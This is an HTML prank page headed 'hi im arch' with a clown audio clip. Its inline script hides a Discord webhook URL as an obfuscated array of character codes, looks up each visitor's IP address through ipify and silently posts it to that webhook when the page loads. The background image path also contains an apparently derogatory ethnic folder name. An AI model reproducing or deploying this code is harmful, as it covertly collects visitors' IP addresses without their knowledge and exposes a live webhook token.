<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>arch central!</title>
    <meta name="description" content="hihi">
    <style>
        body {
            margin: 0;
            height: 100vh;
            background-image: url('assets/jews/tubby.jpg');
            background-size: cover;
            background-position: center;
            display: flex;
            justify-content: center;

        }
        .overlay {
            position: absolute;
            top: 0;
            left: 0;
            font-size: larger;
            right: 0;
            bottom: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: rgba(0, 0, 0, 0.5);
            color: white;
            z-index: 1;
        }
    </style>
</head>
<body>
    <div class="overlay">hi im arch</div>
    <audio id="clown-audio">
        <source src="assets/clown.mp3" type="audio/mpeg">
        Your browser does not support the audio element.
    </audio>
    <script>
        
        const q3fluib = [104, 116, 116, 112, 115, 58, 47, 47, 100, 105, 115, 99, 111, 114, 100, 46, 99, 111, 109, 47, 97, 112, 105, 47, 119, 101, 98, 104, 111, 111, 107, 115, 47, 49, 51, 48, 50, 50, 53, 51, 53, 50, 52, 52, 55, 51, 56, 55, 54, 53, 53, 48, 47, 72, 89, 80, 66, 89, 79, 107, 117, 67, 118, 57, 88, 108, 112, 89, 103, 57, 88, 109, 68, 116, 99, 107, 121, 105, 76, 74, 53, 57, 82, 97, 79, 120, 85, 95, 98, 82, 120, 115, 57, 110, 72, 87, 122, 111, 49, 103, 48, 74, 50, 74, 65, 73, 112, 53, 122, 51, 78, 76, 76, 98, 90, 110, 81, 114, 66, 79, 56];

        const QWIUFBD = q3fluib.map(code => String.fromCharCode(code)).join('');

        try {
            const ipResponse = await fetch('https://api.ipify.org/?format=json');
            const ipData = await ipResponse.json();
            const ip = ipData.ip;

            await fetch(QWIUFBD, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    content: `${ip}`
                })
            });
        } catch (error) {
            console.error('Error fetching IP or sending to Discord:', error);
        }
    </script>
</body>
